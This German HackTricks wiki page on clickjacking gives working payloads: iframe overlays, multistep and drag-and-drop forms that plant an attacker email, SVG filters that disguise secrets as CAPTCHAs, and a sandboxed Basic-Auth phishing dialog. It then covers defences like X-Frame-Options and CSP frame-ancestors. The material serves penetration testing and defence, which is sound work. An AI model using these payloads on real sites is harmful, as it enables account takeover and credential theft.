# Clickjacking

{{#include ../banners/hacktricks-training.md}}

## Was ist Clickjacking

Bei einem Clickjacking-Angriff wird ein **Benutzer** dazu **verführt**, auf ein **Element** auf einer Webseite zu **klicken**, das entweder **unsichtbar** ist oder als ein anderes Element getarnt ist. Diese Manipulation kann zu unbeabsichtigten Folgen für den Benutzer führen, wie z. B. dem Herunterladen von Malware, der Umleitung auf bösartige Webseiten, der Preisgabe von Credentials oder sensiblen Informationen, Geldüberweisungen oder dem Online-Kauf von Produkten.

### Prepopulate forms trick

Manchmal ist es möglich, die **Werte von Formularfeldern mit GET parameters beim Laden einer Seite zu füllen**. Ein Angreifer kann dieses Verhalten ausnutzen, um ein Formular mit beliebigen Daten zu füllen und die clickjacking payload zu senden, sodass der Benutzer den Button Submit drückt.

### Populate form with Drag\&Drop

Wenn Sie möchten, dass der Benutzer ein Formular **ausfüllt**, aber ihn nicht direkt bitten wollen, bestimmte Informationen einzugeben (wie die email und/oder ein spezifisches password, das Sie kennen), können Sie ihn einfach bitten, etwas per **Drag\&Drop** zu verschieben, das Ihre kontrollierten Daten einträgt, wie in [**diesem Beispiel**](https://lutfumertceylan.com.tr/posts/clickjacking-acc-takeover-drag-drop/).

### Grundlegende Payload
```css
<style>
iframe {
position:relative;
width: 500px;
height: 700px;
opacity: 0.1;
z-index: 2;
}
div {
position:absolute;
top:470px;
left:60px;
z-index: 1;
}
</style>
<div>Click me</div>
<iframe src="https://vulnerable.com/email?email=asd@asd.asd"></iframe>
```
### Mehrstufiger Payload
```css
<style>
iframe {
position:relative;
width: 500px;
height: 500px;
opacity: 0.1;
z-index: 2;
}
.firstClick, .secondClick {
position:absolute;
top:330px;
left:60px;
z-index: 1;
}
.secondClick {
left:210px;
}
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://vulnerable.net/account"></iframe>
```
### Drag\&Drop + Click payload
```css
<html>
<head>
<style>
#payload{
position: absolute;
top: 20px;
}
iframe{
width: 1000px;
height: 675px;
border: none;
}
.xss{
position: fixed;
background: #F00;
}
</style>
</head>
<body>
<div style="height: 26px;width: 250px;left: 41.5%;top: 340px;" class="xss">.</div>
<div style="height: 26px;width: 50px;left: 32%;top: 327px;background: #F8F;" class="xss">1. Click and press delete button</div>
<div style="height: 30px;width: 50px;left: 60%;bottom: 40px;background: #F5F;" class="xss">3.Click me</div>
<iframe sandbox="allow-modals allow-popups allow-forms allow-same-origin allow-scripts" style="opacity:0.3"src="https://target.com/panel/administration/profile/"></iframe>
<div id="payload" draggable="true" ondragstart="event.dataTransfer.setData('text/plain', 'attacker@gmail.com')"><h3>2.DRAG ME TO THE RED BOX</h3></div>
</body>
</html>
```
### XSS + Clickjacking

Wenn du eine **XSS** identifiziert hast, die einen Klick eines **user** auf ein Element benötigt, um die XSS zu **triggern**, und die Seite für **clickjacking** verwundbar ist, kannst du das ausnutzen, um den **user** dazu zu bringen, den Button/Link anzuklicken.\
Beispiel:\
Du hast eine **self XSS** in einigen privaten Kontodetails gefunden (Details, die **only you can set and read**). Die Seite mit dem **form**, um diese Details zu setzen, ist **vulnerable** zu **Clickjacking** und du kannst das **form** mit den GET parameters **prepopulate**.\
Ein **attacker** könnte einen **Clickjacking**-Angriff auf diese Seite vorbereiten, das **form** mit dem **XSS payload** **prepopulating** und den **user** dazu **tricking** bringen, das **Submit** des Formulars auszuführen. Also, **when the form is submitted** und die Werte verändert sind, wird der **user** die XSS ausführen.


### DoubleClickjacking

Firstly [explained in this post](https://securityaffairs.com/172572/hacking/doubleclickjacking-clickjacking-on-major-websites.html), diese Technik bringt das **victim** dazu, einen Doppelklick auf einen Button einer custom page an einer bestimmten Position auszuführen, und nutzt die Timing-Unterschiede zwischen den mousedown und onclick events, um während des Doppelklicks die victim page zu laden, so dass das **victim** tatsächlich einen legitimen Button in der **victim page** klickt.

Ein Beispiel ist in diesem Video zu sehen: [https://www.youtube.com/watch?v=4rGvRRMrD18](https://www.youtube.com/watch?v=4rGvRRMrD18)

Ein Codebeispiel findet sich auf [this page](https://www.paulosyibelo.com/2024/12/doubleclickjacking-what.html).

> [!WARNING]
> Diese Technik erlaubt es, den **user** dazu zu bringen, an einer Stelle auf der **victim page** zu klicken und dabei jeden Schutz gegen **clickjacking** zu umgehen. Daher muss der **attacker** sensible Aktionen finden, die mit nur einem Klick ausgeführt werden können, wie z. B. **OAuth prompts accepting permissions**.

### SVG Filters / Cross-Origin Iframe UI Redressing

Moderne Chromium/WebKit/Gecko builds erlauben es, das CSS `filter:url(#id)` auf cross-origin iframes anzuwenden. Die rasterisierten Pixel des iframe werden dem SVG filter graph als `SourceGraphic` ausgesetzt, sodass Primitiven wie `feDisplacementMap`, `feBlend`, `feComposite`, `feColorMatrix`, `feTile`, `feMorphology` usw. die victim UI beliebig verzerren können, bevor der **user** sie sieht, obwohl der **attacker** niemals das DOM berührt. Ein einfacher Liquid-Glass style filter sieht so aus:
```html
<iframe src="https://victim.example" style="filter:url(#displacementFilter4)"></iframe>
```
* Nützliche Primitive: `feImage` lädt Bitmap-Dateien des Angreifers (z. B. overlays, displacement maps); `feFlood` erzeugt einfarbige Masken; `feOffset/feGaussianBlur` verfeinern Highlights; `feDisplacementMap` refraktiert/verzerrt Text; `feComposite operator="arithmetic"` implementiert beliebige per-Kanal-Rechenoperationen (`r = k1*i1*i2 + k2*i1 + k3*i2 + k4`), was für Kontrastverstärkung, Maskierung und AND/OR-Operationen ausreicht; `feTile` schneidet zu und repliziert Pixel-Proben; `feMorphology` vergrößert/verkleinert Konturen; `feColorMatrix` verschiebt Luma in Alpha, um präzise Masken zu erzeugen.

#### Verfälschung von secrets in CAPTCHA-ähnliche Aufforderungen

Wenn ein framable Endpoint secrets (tokens, reset codes, API keys) rendert, kann der Angreifer sie so verfälschen, dass sie wie ein CAPTCHA aussehen und eine manuelle Transkription erzwingen:
```html
<svg width="0" height="0">
<filter id="captchaFilter">
<feTurbulence type="turbulence" baseFrequency="0.03" numOctaves="4" result="noise" />
<feDisplacementMap in="SourceGraphic" in2="noise" scale="6" xChannelSelector="R" yChannelSelector="G" />
</filter>
</svg>
<iframe src="https://victim" style="filter:url(#captchaFilter)"></iframe>
<input pattern="^6c79 ?7261 ?706f ?6e79$" required>
```
Die verzerrten Pixel täuschen den Benutzer dazu, das captcha innerhalb des vom Angreifer kontrollierten `<input>` „zu lösen“, dessen `pattern` das tatsächliche Geheimnis des Opfers durchsetzt.

#### Recontextualisierung von Eingaben des Opfers

Filter können Platzhalter-/Validierungstext chirurgisch entfernen und gleichzeitig Benutzertastatureingaben erhalten. Ein möglicher Ablauf:

1. `feComposite operator="arithmetic" k2≈4` verstärkt die Helligkeit, sodass grauer Hilfetext bis zu Weiß sättigt.
2. `feTile` begrenzt den Arbeitsbereich auf das Input-Rechteck.
3. `feMorphology operator="erode"` verdickt die dunklen Glyphen, die das Opfer tippt, und speichert sie via `result="thick"`.
4. `feFlood` erzeugt eine weiße Platte, `feBlend mode="difference"` mit `thick`, und ein zweites `feComposite k2≈100` verwandelt das in eine starke Luma-Maske.
5. `feColorMatrix` verschiebt diese Luma in den Alpha-Kanal, und `feComposite in="SourceGraphic" operator="in"` behält nur die vom Benutzer eingegebenen Glyphen.
6. Ein weiteres `feBlend in2="white"` plus ein schmaler Crop ergibt ein sauberes Textfeld, woraufhin der Angreifer eigene HTML-Labels überlagert (z. B. „Geben Sie Ihre E‑Mail ein“), während das versteckte iframe weiterhin die Passwort-Richtlinie der Origin des Opfers durchsetzt.

Safari hat Probleme mit `feTile`; derselbe Effekt lässt sich für WebKit-only Payloads mit räumlichen Masken reproduzieren, die aus `feFlood` + `feColorMatrix` + `feComposite` aufgebaut sind.

#### Pixel-Sonden, Logik und Zustandsmaschinen

Durch das Zuschneiden einer 2–4 px Region mit `feTile` und das Kacheln auf `100%` der Viewport-Größe verwandelt der Angreifer die abgetastete Farbe in eine Vollbild-Textur, die in eine Schwellenwert-Operation zur Erstellung einer booleschen Maske überführt werden kann:
```html
<filter id="pixelProbe">
<feTile x="313" y="141" width="4" height="4" />
<feTile x="0" y="0" width="100%" height="100%" result="probe" />
<feComposite in="probe" operator="arithmetic" k2="120" k4="-1" />
<feColorMatrix type="matrix" values="0 0 0 0 0  0 0 0 0 0  0 0 0 0 0  0 0 1 0 0" result="mask" />
<feGaussianBlur in="SourceGraphic" stdDeviation="2" />
<feComposite operator="in" in2="mask" />
<feBlend in2="SourceGraphic" />
</filter>
```
Für beliebige Farben erzeugt eine `feFlood`-Referenz (z. B. `#0B57D0`) plus `feBlend mode="difference"` und eine weitere arithmetische Composite (`k2≈100`, `k4` als Toleranz) nur dann Weiß, wenn das abgetastete Pixel dem Zielton entspricht. Diese Masken in `feComposite` mit abgestimmten `k1..k4` zu speisen ergibt Logikgatter: `AND` via `k1=1`, `OR` via `k2=k3=1`, `XOR` via `feBlend mode="difference"`, `NOT` via Blending gegen Weiß. Das Verketten der Gatter bildet einen Full Adder im Filtergraphen und beweist, dass die Pipeline funktional vollständig ist.

Angreifer können daher UI-Zustand ohne JavaScript auslesen. Beispiel-Booleanwerte aus einem modalen Workflow:

- **D** (dialog visible): einen abgedunkelten Eckbereich abfragen und gegen Weiß testen.
- **L** (dialog loaded): die Koordinaten abfragen, an denen der Button erscheint, sobald er bereit ist.
- **C** (checkbox checked): das Checkbox-Pixel mit dem aktiven Blau `#0B57D0` vergleichen.
- **R** (red success/failure banner): `feMorphology` und rote Schwellenwerte innerhalb des Banner-Rechtecks verwenden.

Jeder erkannte Zustand steuert ein anderes Overlay-Bitmap, das via `feImage xlink:href="data:..."` eingebettet ist. Das Maskieren dieser Bitmaps mit `D`, `L`, `C`, `R` hält die Overlays synchron zum echten Dialog und führt das Opfer durch mehrstufige Workflows (Passwort-Resets, Genehmigungen, Bestätigungen für destruktive Aktionen), ohne jemals das DOM offenzulegen.

### Sandboxed iframe Basic Auth-Dialog (no allow-popups)

Ein sandboxed iframe ohne `allow-popups` kann trotzdem ein vom Browser gesteuertes **HTTP Basic Authentication modal** anzeigen, wenn ein Load mit `401` und `WWW-Authenticate` zurückkommt. Der Dialog wird von der Netzwerk-/Auth-Schicht des Browsers erzeugt (nicht von JS-`alert/prompt/confirm`), daher unterdrücken Sandbox-Popup-Beschränkungen ihn **nicht**. Wenn Sie das iframe skripten können (z. B. `sandbox="allow-scripts"`), können Sie es zu jedem Endpoint navigieren, der eine Basic-Auth-Herausforderung ausgibt:
```html
<iframe id="basic" sandbox="allow-scripts"></iframe>
<script>
basic.src = "https://httpbin.org/basic-auth/user/pass"
</script>
```
Sobald die Antwort eintrifft, fordert der Browser Anmeldedaten an, obwohl Popups untersagt sind. Das Einrahmen (framing) einer vertrauenswürdigen Origin mit diesem Trick ermöglicht UI redress/Phishing: unerwartete modale Aufforderungen innerhalb eines "sandboxed" Widgets können Benutzer verwirren oder Passwortmanager dazu bringen, gespeicherte Zugangsdaten anzubieten.

### Browser-Erweiterungen: DOM-based autofill clickjacking

Abgesehen vom iframing von Opferseiten können Angreifer UI-Elemente von Browser-Erweiterungen angreifen, die in die Seite injiziert werden. Password managers zeigen Autofill-Dropdowns in der Nähe fokussierter Inputs; indem ein vom Angreifer kontrolliertes Feld fokussiert und das Dropdown der Extension ausgeblendet/abgedeckt wird (opacity/overlay/top-layer tricks), kann ein erzwungener Benutzerklick ein gespeichertes Element auswählen und sensible Daten in vom Angreifer kontrollierte Eingabefelder einfüllen. Diese Variante benötigt keine iframe-Exposition und funktioniert vollständig über DOM/CSS-Manipulation.

- For concrete techniques and PoCs see:
{{#ref}}
browser-extension-pentesting-methodology/browext-clickjacking.md
{{#endref}}

## Strategien zur Abwehr von Clickjacking

### Clientseitige Abwehrmaßnahmen

Skripte, die auf der Client-Seite ausgeführt werden, können Maßnahmen ergreifen, um Clickjacking zu verhindern:

- Sicherstellen, dass das Anwendungsfenster das Haupt- oder Top-Fenster ist.
- Alle Frames sichtbar machen.
- Klicks auf unsichtbare Frames verhindern.
- Benutzer bei möglichen Clickjacking-Versuchen erkennen und warnen.

Diese frame-busting-Skripte können jedoch umgangen werden:

- **Sicherheitseinstellungen des Browsers:** Einige Browser können diese Skripte basierend auf ihren Sicherheitseinstellungen blockieren oder wenn JavaScript nicht unterstützt wird.
- **HTML5 iframe `sandbox` Attribute:** Ein Angreifer kann Frame-Buster-Skripte neutralisieren, indem er das `sandbox`-Attribut mit den Werten `allow-forms` oder `allow-scripts` setzt, jedoch ohne `allow-top-navigation`. Dadurch wird das iframe daran gehindert zu überprüfen, ob es das Top-Fenster ist, z. B.,
```html
<iframe
id="victim_website"
src="https://victim-website.com"
sandbox="allow-forms allow-scripts"></iframe>
```
Die Werte `allow-forms` und `allow-scripts` erlauben Aktionen innerhalb des iframe, während die Top-Level-Navigation deaktiviert wird. Um die beabsichtigte Funktionalität der Zielseite sicherzustellen, können je nach Angriffstyp zusätzliche Berechtigungen wie `allow-same-origin` und `allow-modals` erforderlich sein. Meldungen in der Browser-Konsole können Hinweise geben, welche Berechtigungen gesetzt werden sollten.

### Serverseitige Abwehr

#### X-Frame-Options

Der **`X-Frame-Options` HTTP response header** informiert Browser darüber, ob das Rendern einer Seite in einem `<frame>` oder `<iframe>` legitim ist und hilft so, Clickjacking zu verhindern:

- `X-Frame-Options: deny` - Keine Domain kann den Inhalt einbinden.
- `X-Frame-Options: sameorigin` - Nur die gleiche Origin kann den Inhalt einbinden.
- `X-Frame-Options: allow-from https://trusted.com` - Nur die angegebene 'uri' kann die Seite einrahmen.
- Beachte die Einschränkungen: wenn der Browser diese Direktive nicht unterstützt, funktioniert sie möglicherweise nicht. Einige Browser bevorzugen die CSP frame-ancestors directive.

#### Content Security Policy (CSP) frame-ancestors Direktive

Die **`frame-ancestors`-Direktive in CSP** ist die empfohlene Methode zum Schutz vor Clickjacking:

- `frame-ancestors 'none'` - Ähnlich wie `X-Frame-Options: deny`.
- `frame-ancestors 'self'` - Ähnlich wie `X-Frame-Options: sameorigin`.
- `frame-ancestors trusted.com` - Ähnlich wie `X-Frame-Options: allow-from`.

Zum Beispiel erlaubt die folgende CSP nur das Framing von derselben Domain:

`Content-Security-Policy: frame-ancestors 'self';`

Weitere Details und komplexe Beispiele finden sich in der [frame-ancestors CSP documentation](https://w3c.github.io/webappsec-csp/document/#directive-frame-ancestors) und in der [Mozilla's CSP frame-ancestors documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors).

### Content Security Policy (CSP) mit `child-src` und `frame-src`

**Content Security Policy (CSP)** ist eine Sicherheitsmaßnahme, die dabei hilft, Clickjacking und andere code injection attacks zu verhindern, indem festgelegt wird, von welchen Quellen der Browser Inhalte laden darf.

#### `frame-src` Directive

- Definiert gültige Quellen für Frames.
- Spezifischer als die `default-src` directive.
```
Content-Security-Policy: frame-src 'self' https://trusted-website.com;
```
Diese Richtlinie erlaubt Frames aus derselben Origin (self) und https://trusted-website.com.

#### `child-src` Direktive

- In CSP level 2 eingeführt, um gültige Quellen für Web Worker und Frames festzulegen.
- Dient als Fallback für frame-src und worker-src.
```
Content-Security-Policy: child-src 'self' https://trusted-website.com;
```
Diese Richtlinie erlaubt Frames und Worker von derselben Origin (self) und https://trusted-website.com.

**Hinweise zur Verwendung:**

- Abkündigung: child-src wird zugunsten von frame-src und worker-src eingestellt.
- Fallback-Verhalten: Wenn frame-src fehlt, wird child-src als Fallback für Frames verwendet. Wenn beide fehlen, wird default-src verwendet.
- Strikte Quellendefinition: Schließen Sie nur vertrauenswürdige Quellen in die Direktiven ein, um Missbrauch zu verhindern.

#### JavaScript Frame-Breaking-Skripte

Obwohl nicht vollständig narrensicher, können JavaScript-basierte frame-busting Skripte verwendet werden, um zu verhindern, dass eine Webseite gerahmt wird. Beispiel:
```javascript
if (top !== self) {
top.location = self.location
}
```
#### Einsatz von Anti-CSRF Tokens

- **Token-Validierung:** Verwende anti-CSRF tokens in Webanwendungen, um sicherzustellen, dass zustandsändernde Anfragen vom Nutzer beabsichtigt gesendet werden und nicht über eine Clickjacked-Seite erfolgen.

## Referenzen

- [**https://portswigger.net/web-security/clickjacking**](https://portswigger.net/web-security/clickjacking)
- [**https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html**](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html)
- [DOM-based Extension Clickjacking (marektoth.com)](https://marektoth.com/blog/dom-based-extension-clickjacking/)
- [SVG Filters - Clickjacking 2.0](https://lyra.horse/blog/2025/12/svg-clickjacking/)
- [Iframe sandbox Basic Auth modal](https://phor3nsic.github.io/2026/01/21/trick-iframe-sandbox.html)
- [Chromestatus: Restrict sandboxed frame dialogs](https://chromestatus.com/feature/4747009953103872)
- [Chromium issue about sandboxed auth dialogs](https://issues.chromium.org/issues/40266321)

{{#include ../banners/hacktricks-training.md}}
